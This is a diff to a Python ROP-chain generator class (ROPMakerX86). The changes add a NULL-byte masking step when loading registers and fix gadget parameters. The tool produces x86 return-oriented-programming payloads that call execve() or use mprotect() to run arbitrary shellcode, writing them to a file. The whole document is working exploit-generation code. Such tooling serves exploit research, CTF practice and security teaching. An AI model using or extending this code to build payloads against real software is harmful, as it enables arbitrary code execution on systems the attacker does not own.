@@ -394,7 +394,7 @@ class ROPMakerX86(object):
 
 
 
-    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
+    def customRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask):
 
         sects = self.__binary.getDataSections()
         dataAddr = None
@@ -419,13 +419,17 @@ class ROPMakerX86(object):
             chunk = len(arg) // 4        
             for j in range(chunk): 
                 
-                p += pack('<I', popDst["vaddr"]) 
-                p += pack('<I', stack) 
-                p += self.__custompadding(popDst, {})
+                #p += pack('<I', popDst["vaddr"]) 
+                #p += pack('<I', stack) 
+                #p += self.__custompadding(popDst, {})
 
-                p += pack('<I', popSrc["vaddr"]) 
-                p += arg[j*4:j*4+4] 
-                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+                p += self.GenerateMaskRopChain(stack, chainmask, popDst, {})
+
+                #p += pack('<I', popSrc["vaddr"]) 
+                #p += arg[j*4:j*4+4] 
+                #p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+
+                p += self.GenerateMaskRopChain(int.from_bytes(arg[j*4:j*4+4], "little"), chainmask, popSrc, {popDst["gadget"].split()[1]: stack})
 
                 p += pack('<I', write4where["vaddr"]) 
                 p += self.__custompadding(write4where, {}) 
@@ -440,9 +444,11 @@ class ROPMakerX86(object):
             if (b'\x07' in lastWord):
                 locationForNULL = stack - (4 - lastWord.index(b'\x07'))         # Write a NULL at the end of the argument
 
-            p += pack('<I', popDst["vaddr"]) 
-            p += pack('<I', locationForNULL)
-            p += self.__custompadding(popDst, {})
+            #p += pack('<I', popDst["vaddr"]) 
+            #p += pack('<I', locationForNULL)
+            #p += self.__custompadding(popDst, {})
+
+            p += self.GenerateMaskRopChain(locationForNULL, chainmask, popDst, {})
 
             p += pack('<I', xorSrc["vaddr"]) 
             p += self.__custompadding(xorSrc, {})
@@ -461,13 +467,17 @@ class ROPMakerX86(object):
 
         for arg in self.__execve:
 
-            p += pack('<I', popDst["vaddr"]) 
-            p += pack('<I', stack) 
-            p += self.__custompadding(popDst, {})
+            #p += pack('<I', popDst["vaddr"]) 
+            #p += pack('<I', stack) 
+            #p += self.__custompadding(popDst, {})
 
-            p += pack('<I', popSrc["vaddr"]) 
-            p += pack('<I', dataAddr + argindex) 
-            p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+            p += self.GenerateMaskRopChain(stack, chainmask, popDst, {})
+
+            #p += pack('<I', popSrc["vaddr"]) 
+            #p += pack('<I', dataAddr + argindex) 
+            #p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+
+            p += self.GenerateMaskRopChain(dataAddr + argindex, chainmask, popSrc, {popDst["gadget"].split()[1]: stack})
 
             p += pack('<I', write4where["vaddr"]) 
             p += self.__custompadding(write4where, {})        
@@ -477,9 +487,11 @@ class ROPMakerX86(object):
 
             #writes arg on shadowstack
         
-        p += pack('<I', popDst["vaddr"]) 
-        p += pack('<I', stack) 
-        p += self.__custompadding(popDst, {})
+        #p += pack('<I', popDst["vaddr"]) 
+        #p += pack('<I', stack) 
+        #p += self.__custompadding(popDst, {})
+
+        p += self.GenerateMaskRopChain(stack, chainmask, popDst, {})
 
         p += pack('<I', xorSrc["vaddr"]) 
         p += self.__custompadding(xorSrc, {})
@@ -489,21 +501,27 @@ class ROPMakerX86(object):
 
         #adding null
 
-        p += pack('<I', popEbx["vaddr"]) 
-        p += pack('<I', dataAddr) 
-        p += self.__custompadding(popEbx, {})
+        #p += pack('<I', popEbx["vaddr"]) 
+        #p += pack('<I', dataAddr) 
+        #p += self.__custompadding(popEbx, {})
+
+        p += self.GenerateMaskRopChain(dataAddr, chainmask, popEbx, {})
 
         #puts stack in to ebx (program)
 
-        p += pack('<I', popEcx["vaddr"]) 
-        p += pack('<I', safestack) 
-        p += self.__custompadding(popEcx, {"ebx": dataAddr})  
+        #p += pack('<I', popEcx["vaddr"]) 
+        #p += pack('<I', safestack) 
+        #p += self.__custompadding(popEcx, {"ebx": dataAddr}) 
+
+        p += self.GenerateMaskRopChain(safestack, chainmask, popEcx, {"ebx": dataAddr}) 
 
         #puts stack + 60 in to ecx (args)
 
-        p += pack('<I', popEdx["vaddr"]) 
-        p += pack('<I', stack) 
-        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
+        #p += pack('<I', popEdx["vaddr"]) 
+        #p += pack('<I', stack) 
+        #p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
+
+        p += self.GenerateMaskRopChain(stack, chainmask, popEdx, {"ebx": dataAddr, "ecx": safestack})
 
         #puts stack in to edx (env)
 
@@ -525,6 +543,8 @@ class ROPMakerX86(object):
         outputfile = open(self.__FILE_NAME, "wb")
         outputfile.write(p)
         outputfile.close()
+
+        print("{0} - Arbitrary execve() ROP chain written to {1}. The ROP chain is {2} bytes long".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME, len(p)))
 
 
     def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, maskEdx, syscall, chainmask):
@@ -586,13 +606,13 @@ class ROPMakerX86(object):
         # Setup mprotect()
 
         # ECX = length of shellcode
-        p += self.GenerateMaskRopChain(len_shellCode, maskEcx, {})
+        p += self.GenerateMaskRopChain(len_shellCode, maskEcx, popEcx, {})
 
         # EBX = loc_shellCode
-        p += self.GenerateMaskRopChain(start_of_page, maskEbx, {"ecx" : len_shellCode})
+        p += self.GenerateMaskRopChain(start_of_page, maskEbx, popEbx, {"ecx" : len_shellCode})
 
         # EDX = 4
-        p += self.GenerateMaskRopChain(0x00000007, maskEdx, {"ebx" : start_of_page, "ecx" : len_shellCode})
+        p += self.GenerateMaskRopChain(0x00000007, maskEdx, popEdx, {"ebx" : start_of_page, "ecx" : len_shellCode})
 
         # EAX = 125
         p += pack("<I", xorEax["vaddr"])
@@ -614,12 +634,12 @@ class ROPMakerX86(object):
         file.write(p)
         file.close()
 
-        print("{0} - Arbitrary shell code ROPchain written to {1}".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME))
+        print("{0} - Arbitrary shell code ROP chain written to {1}. The ROP chain is {2} bytes long".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME, len(p)))
 
     def testingmasking(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, MaskEdx, syscall, chainmask):
      
         p = b'\x41' * self.padding
-        p += self.GenerateMaskRopChain(4096, maskEcx, {})
+        p += self.GenerateMaskRopChain(4096, maskEcx, popEcx, {})
 
         print("ROPCHAIN is:", p)
         file = open("test_ROP", "wb")
@@ -628,16 +648,16 @@ class ROPMakerX86(object):
 
      # Apply mask rop chain
     
-    def GenerateMaskRopChain(self, value, listchainmask, otherregs , gadget_address=False):
+    def GenerateMaskRopChain(self, value, listchainmask, nonmask_gadget, otherregs, gadget_address=False):
         
         # If the value doesn't contain any NULLs then we can just return
         if (not (nh(self.__WORD_SIZE).contains_null(value.to_bytes(self.__WORD_SIZE, "big"))) ):
             
             # pop to dst
-            alt_p  = pack("<I", listchainmask[0]["maskchain"][1]["vaddr"])
+            alt_p  = pack("<I", nonmask_gadget["vaddr"])
             alt_p += pack("<I", value)
 
-            alt_p += self.__custompadding(listchainmask[0]["maskchain"][1], otherregs)
+            alt_p += self.__custompadding(nonmask_gadget, otherregs)
             
             #alt_p += pack()
 
@@ -792,7 +812,6 @@ class ROPMakerX86(object):
         #for printvalue in printminp:
         #    print(printvalue)
 
-        print("{0} - Arbitrary execve() ROPchain written to {1}".format(datetime.now().strftime("%H:%M:%S"), self.__FILE_NAME))
         return minp
 
 
@@ -855,7 +874,7 @@ class ROPMakerX86(object):
             #getting second source
             #chainmask = self.__lookingForMasks(write4where[1], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
             # I not sure about writing to src karl, not sure about it one bit
-            listchainmask = self.GettingMaskChains(write4where[2], write4where[2])
+            listchainmask = self.GettingMaskChains(write4where[1], write4where[2])
             
             if(not listchainmask):
                 print("\t[-] Can't find the 'mask chain' gadget. Try with another 'mov [r], r'\n")
@@ -983,5 +1002,5 @@ class ROPMakerX86(object):
         if (self.__FILE_PATH_SHELLCODE):
             self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
         else:
-            self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+            self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, listchainmask)
         
